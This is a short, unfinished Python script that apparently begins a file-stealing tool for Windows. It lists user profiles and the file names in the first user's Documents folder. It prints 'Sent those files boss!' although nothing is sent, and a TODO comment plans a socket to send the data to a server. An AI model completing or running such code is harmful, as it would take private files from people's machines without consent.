from os import path
from glob import glob
import socket
def getuser(): # Get all users from C:\Users\
    return [path.basename(x) for x in glob('C:\\Users\\*') if x not in ['C:\\Users\\Public', 'C:\\Users\\All Users', 'C:\\Users\\Default', 'C:\\Users\\Default User', 'C:\\Users\\desktop.ini']]

def getfiles(scan_user: str, dict_files: str):
    return [path.basename(x) for x in glob('C:\\Users\\'+scan_user+'\\'+dict_files+'\\*') if '.lnk' not in x]

def sendFiles():
    users = getuser()
    try:
        local_files = getfiles(users[0], "Documents")
    except:
        local_files = getfiles(users[0], "Dokumenty")
    print("Sent those files boss!")
    
    # TODO Create a sending socket to the server send the users first then the files
    